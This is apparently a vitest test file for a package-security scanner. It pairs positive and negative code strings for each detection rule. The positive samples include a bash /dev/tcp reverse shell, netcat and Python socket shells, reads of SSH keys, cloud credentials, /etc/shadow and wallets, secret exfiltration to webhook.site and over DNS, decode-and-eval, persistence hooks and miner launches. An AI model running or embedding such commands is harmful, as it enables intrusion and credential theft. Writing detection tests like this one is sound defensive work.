import * as path from 'node:path';
import { beforeAll, describe, expect, it } from 'vitest';
import type { Language, ResolvedDep } from '../../../src/core/types';
import { compileRule, loadRules, type CompiledRule } from '../../../src/rules/loader';
import { scanPackageCode } from '../../../src/scanners/codeScanner';

// Every snippet here is an inert string that is only pattern-matched, never executed.
type Lang = 'js' | 'py';
interface Case {
  lang: Lang;
  pos: string[];
  neg: string[];
}

const CASES: Record<string, Case> = {
  'exec/node-child-process': {
    lang: 'js',
    pos: ["const cp = require('child_process');\ncp.spawn('ls', ['-la']);"],
    neg: ["const x = require('path');\nspawn();"],
  },
  'exec/node-child-process-shell': {
    lang: 'js',
    pos: ["require('child_process').exec('ls')", "spawn('ls', [], { shell: true })"],
    neg: ["spawn('git', ['status'], { shell: false })"],
  },
  'exec/node-dynamic-command': {
    lang: 'js',
    pos: ['execSync(`curl ${url}`)', 'exec(cmd + args)'],
    neg: ["execSync('git status')"],
  },
  'exec/python-shell': {
    lang: 'py',
    pos: ["os.system('ls')", 'subprocess.run(cmd, shell=True)'],
    neg: ["subprocess.run(['ls'], shell=False)"],
  },
  'exec/python-pty-spawn': { lang: 'py', pos: ["pty.spawn('/bin/bash')"], neg: ['import pty'] },
  'exec/reverse-shell': {
    lang: 'js',
    pos: ["const c = 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1';", "run('nc -e /bin/sh host 1')"],
    neg: ["const devices = '/dev/null';"],
  },
  'exec/python-socket-shell': {
    lang: 'py',
    pos: ["s = socket.socket()\nos.dup2(s.fileno(), 0)\npty.spawn('/bin/sh')"],
    neg: ['s = socket.socket()\ns.connect(addr)'],
  },
  'secrets-fs/ssh-keys': {
    lang: 'js',
    pos: ["fs.readFileSync(home + '/.ssh/id_rsa')"],
    neg: ["const knownHosts = '~/.ssh/known_hosts';"],
  },
  'secrets-fs/cloud-credentials': {
    lang: 'js',
    pos: ["path.join(home, '.aws/credentials')", "path.join(home, '.kube/config')"],
    neg: ["const region = 'us-east-1';"],
  },
  'secrets-fs/package-manager-tokens': {
    lang: 'js',
    pos: ["fs.readFileSync(home + '/.npmrc')"],
    neg: ["const docs = 'see the npmrc docs';"],
  },
  'secrets-fs/browser-data': {
    lang: 'js',
    pos: ["const p = 'Google/Chrome/Default/Login Data';"],
    neg: ["const p = 'Google/Chrome/Default/Preferences';"],
  },
  'secrets-fs/macos-keychain': {
    lang: 'js',
    pos: ["execSync('security find-generic-password -s x')"],
    neg: ["const security = require('./security');"],
  },
  'secrets-fs/system-shadow': {
    lang: 'py',
    pos: ["open('/etc/shadow')"],
    neg: ["open('/etc/hosts')"],
  },
  'secrets-fs/crypto-wallets': {
    lang: 'js',
    pos: ["const w = 'Exodus/exodus.wallet';", "const id = 'nkbihfbeogaeaoehlefnkodbefgpgknn';"],
    neg: ['const wallet = new Wallet();'],
  },
  'env-access/serialize-env': {
    lang: 'js',
    pos: ['const s = JSON.stringify(process.env);'],
    neg: ['const s = JSON.stringify(process.env.NODE_ENV);'],
  },
  'env-access/enumerate-env': {
    lang: 'js',
    pos: ['Object.keys(process.env).forEach((k) => k);'],
    neg: ['const k = Object.keys(config);'],
  },
  'env-access/token-variables': {
    lang: 'js',
    pos: ['const t = process.env.GITHUB_TOKEN;', "const t = process.env['NPM_TOKEN'];"],
    neg: ['const t = process.env.NODE_ENV;'],
  },
  'network/exfil-endpoint': {
    lang: 'js',
    pos: ["fetch('https://webhook.site/abc')", "const h = 'abc.oast.fun';"],
    neg: ["fetch('https://api.example.invalid/v1')"],
  },
  'network/chat-webhook': {
    lang: 'js',
    pos: ["const u = 'https://discord.com/api/webhooks/1/x';"],
    neg: ["const u = 'https://discord.com/developers';"],
  },
  'network/raw-ip-url': {
    lang: 'js',
    pos: ["http.get('http://203.0.113.7:8080/x')"],
    neg: ["http.get('http://127.0.0.1:3000')", "http.get('http://192.168.1.10/')"],
  },
  'network/ip-lookup': {
    lang: 'js',
    pos: ["fetch('https://api.ipify.org?format=json')"],
    neg: ["fetch('https://example.invalid')"],
  },
  'network/dns-exfiltration': {
    lang: 'js',
    pos: ["dns.resolve(Buffer.from(os.hostname()).toString('hex') + '.x.example.invalid', cb)"],
    neg: ["dns.lookup('example.invalid', cb)"],
  },
  'network/python-dns-exfiltration': {
    lang: 'py',
    pos: ["socket.gethostbyname(getpass.getuser().encode().hex() + '.x.example.invalid')"],
    neg: ["socket.gethostbyname('example.invalid')"],
  },
  'exfiltration/env-to-network': {
    lang: 'js',
    pos: ['const p = JSON.stringify(process.env);\nhttps.request(opts);'],
    neg: ['const p = JSON.stringify({ a: 1 });\nhttps.request(opts);'],
  },
  'exfiltration/python-env-to-network': {
    lang: 'py',
    pos: ['requests.post(URL, data=dict(os.environ))'],
    neg: ["requests.post(URL, data={'a': 1})"],
  },
  'exfiltration/secret-file-to-network': {
    lang: 'js',
    pos: ["const k = fs.readFileSync(home + '/.ssh/id_rsa');\nfetch(url, { body: k });"],
    neg: [
      "const f = process.env.AWS_SHARED_CREDENTIALS_FILE || '~/.aws/credentials';\nfetch(url);",
    ],
  },
  'exfiltration/secret-file-to-webhook': {
    lang: 'js',
    pos: ["const k = read('.npmrc');\nfetch('https://webhook.site/x', { body: k });"],
    neg: ["fetch('https://webhook.site/x');"],
  },
  'exfiltration/homedir-read-and-send': {
    lang: 'js',
    pos: ["const d = fs.readFileSync(path.join(os.homedir(), '.config/x'));\nfetch(u);"],
    neg: ["const d = fs.readFileSync('./x');\nfetch(u);"],
  },
  'exfiltration/system-info-beacon': {
    lang: 'js',
    pos: ['const h = os.hostname();\nconst u = os.userInfo().username;\nhttps.request(o);'],
    neg: ['const h = os.hostname();\nhttps.request(o);'],
  },
  'dynamic-code/eval-non-literal': {
    lang: 'js',
    pos: ['eval(code)', 'const f = new Function(body);'],
    neg: ['model.eval(x)', "const g = new Function('return this')();"],
  },
  'dynamic-code/vm-run': {
    lang: 'js',
    pos: ['vm.runInNewContext(src, sandbox)'],
    neg: ["const vm = require('vm');"],
  },
  'dynamic-code/module-compile': {
    lang: 'js',
    pos: ['m._compile(source, filename)'],
    neg: ['m._compiled = true;'],
  },
  'dynamic-code/decode-and-execute': {
    lang: 'js',
    pos: ["eval(Buffer.from(p, 'base64').toString())", 'new Function(atob(p))()'],
    neg: ["eval('1+1')"],
  },
  'dynamic-code/python-exec-non-literal': {
    lang: 'py',
    pos: ['exec(payload)'],
    neg: ["exec(open('pkg/version.py').read())", "exec('x = 1')", 'self.exec(job)'],
  },
  'dynamic-code/marshal-loads': {
    lang: 'py',
    pos: ['code = marshal.loads(data)'],
    neg: ['import marshal'],
  },
  'dynamic-code/python-hidden-import': {
    lang: 'py',
    pos: ["__import__('os').system('id')"],
    neg: ["__import__('json')"],
  },
  'persistence/shell-profile': {
    lang: 'js',
    pos: ["fs.appendFileSync(path.join(home, '.bashrc'), line)"],
    neg: ["const doc = 'add this to your .bashrc';"],
  },
  'persistence/autostart': {
    lang: 'js',
    pos: ["const p = '~/Library/LaunchAgents/com.x.plist';", "run('crontab -l')"],
    neg: ["const p = '~/Library/Preferences';"],
  },
  'crypto-mining/stratum-pool': {
    lang: 'js',
    pos: ["const pool = 'stratum+tcp://pool.example.invalid:3333';"],
    neg: ["const s = 'stratum';"],
  },
  'crypto-mining/miner': {
    lang: 'js',
    pos: ["spawn('./xmrig', args)"],
    neg: ["const mining = 'data mining';"],
  },
};

// Python-language rules that should also be checked against their Python spelling.
const EXTRA_PY_POSITIVES: Record<string, string[]> = {
  'dynamic-code/decode-and-execute': [
    'exec(base64.b64decode(p))',
    'exec(compile(zlib.decompress(p), "<x>", "exec"))',
  ],
  'secrets-fs/ssh-keys': ["open(os.path.expanduser('~/.ssh/id_ed25519'))"],
};

const LANGUAGE: Record<Lang, Language> = { js: 'javascript', py: 'python' };
const dep: ResolvedDep = {
  ecosystem: 'npm',
  name: 'fixture-pkg',
  version: '1.0.0',
  installPath: '/pkg',
  direct: true,
  isDev: false,
};

let rules: CompiledRule[] = [];

beforeAll(async () => {
  const loaded = await loadRules([path.resolve(__dirname, '../../../rules/builtin')]);
  rules = loaded.rules.map(compileRule);
});

async function ruleIdsFor(lang: Lang, code: string): Promise<string[]> {
  const file = `/pkg/sample.${lang}`;
  const findings = await scanPackageCode({
    dep,
    files: [file],
    languageOf: () => LANGUAGE[lang],
    rules,
    maxFileSizeBytes: 1e6,
    obfuscation: false,
    readFile: async () => code,
  });
  return findings.map((f) => f.ruleId);
}

describe('built-in rules', () => {
  it('every built-in rule has positive and negative cases', () => {
    const ids = rules.map((r) => r.rule.id).sort();
    expect(Object.keys(CASES).sort()).toEqual(ids);
  });

  for (const [id, c] of Object.entries(CASES)) {
    describe(id, () => {
      for (const code of c.pos) {
        it(`matches: ${code.split('\n').at(-1)}`, async () => {
          expect(await ruleIdsFor(c.lang, code)).toContain(id);
        });
      }
      for (const code of c.neg) {
        it(`ignores: ${code.split('\n').at(-1)}`, async () => {
          expect(await ruleIdsFor(c.lang, code)).not.toContain(id);
        });
      }
      for (const code of EXTRA_PY_POSITIVES[id] ?? []) {
        it(`matches python: ${code}`, async () => {
          expect(await ruleIdsFor('py', code)).toContain(id);
        });
      }
      it('ignores the positive case when it is commented out', async () => {
        const commented = (c.pos[0] as string)
          .split('\n')
          .map((l) => `${c.lang === 'py' ? '#' : '//'} ${l}`)
          .join('\n');
        expect(await ruleIdsFor(c.lang, commented)).not.toContain(id);
      });
    });
  }
});
